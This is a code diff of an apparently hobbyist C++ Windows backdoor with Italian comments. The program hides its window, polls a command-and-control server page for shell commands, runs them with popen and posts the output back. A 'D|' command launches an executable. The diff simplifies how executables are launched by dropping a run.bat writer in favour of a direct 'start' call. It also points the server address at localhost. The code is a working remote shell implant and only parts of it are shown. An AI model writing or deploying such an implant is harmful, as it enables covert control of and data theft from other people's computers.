@@ -18,19 +18,18 @@ using namespace std;
 
 
 
-string ExecuteCommand(const string& command);
+string executeCommand(const string& command, bool getOutput);
 string getCommand(const string& address, const string& page);
 void sendOutput(const string& address, const string& page, const string& output);
 bool sendHttpRequests(const string& address, const string& page, string& response, BOOL sendsParams, const string& data);
 void hideWindow();
 string URLEncode(const string& value);
-bool deployExe(string path);
 
 
-string server = "192.168.1.204";
+string server = "localhost";
 string shellNo = "0";
-string shellFilePath = "/c2/shell"+shellNo+".txt";
-string outputPagePath = "/c2/output.php";
+string shellFilePath = "/shell"+shellNo+".txt";
+string outputPagePath = "/output.php";
 
 
 int main(){
@@ -45,21 +44,17 @@ int main(){
         command = getCommand(server, shellFilePath);
 
         if(command.substr(0, 2) == "D|"){
-
+            
             //metto in command il nome dell'eseguibile
             command = command.substr(2, command.size());
 
-            if(deployExe(command)){
-                sendOutput(server, outputPagePath, "programma eseguito con successo");
-            }
-            else{
-                sendOutput(server, outputPagePath, "errore durante l'esecuzione del programma");
-            }
+            executeCommand("start \"\" \""+command+"\"", false);
+            sendOutput(server, outputPagePath, "Eseguito!");
 
         }
         else if(command != ""){
             
-            result = ExecuteCommand(command);
+            result = executeCommand(command, true);
             if(result==""){
 
                 sendOutput(server, outputPagePath, "output non letto");
@@ -79,17 +74,22 @@ int main(){
 
 }
 
-string ExecuteCommand(const string& command) {
+string executeCommand(const string& command, bool getOutput) {
     array<char, 128> buffer;
     string result;
     unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
     if (!pipe) {
         throw std::runtime_error("popen() failed!");
     }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-        result += buffer.data();
+
+    //nel caso di un esecuzione di un eseguibile bisogna bloccare la raccolta dell'output senò una volta eseguito
+    //la shell si blocca
+    if(getOutput){
+        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+            result += buffer.data();
+        }
+        return result;
     }
-    return result;
 
     /*
     
@@ -121,9 +121,9 @@ string getCommand(const string& address, const string& page){
         return "";
 
     }
-    else if(response[index+1] == ';'){
+    else if(response[index+1] == ':'){
 
-        return "D|"+response.substr(index+1, response.size());
+        return "D|"+response.substr(index+2, response.size());
 
     }
 
@@ -131,24 +131,6 @@ string getCommand(const string& address, const string& page){
     //prende l'ultima riga che corrisponde al comando da eseguire
     //questo per mantenere uno storico
 
-}
-
-bool deployExe(string path){
-
-    string payload = "@echo off\n"
-                     "start \"\" \"" + path + "\"\n"
-                     "exit\n";
-
-    // Scrivi il contenuto nel file run.bat
-    ofstream outFile("run.bat");
-    if (outFile.is_open()) {
-        outFile << payload;  // Scrivi il payload nel file
-        outFile.close();     // Chiudi il file
-        return true;
-    } else {
-        return false;
-    }
-    ExecuteCommand("run.bat");
 }
 
 
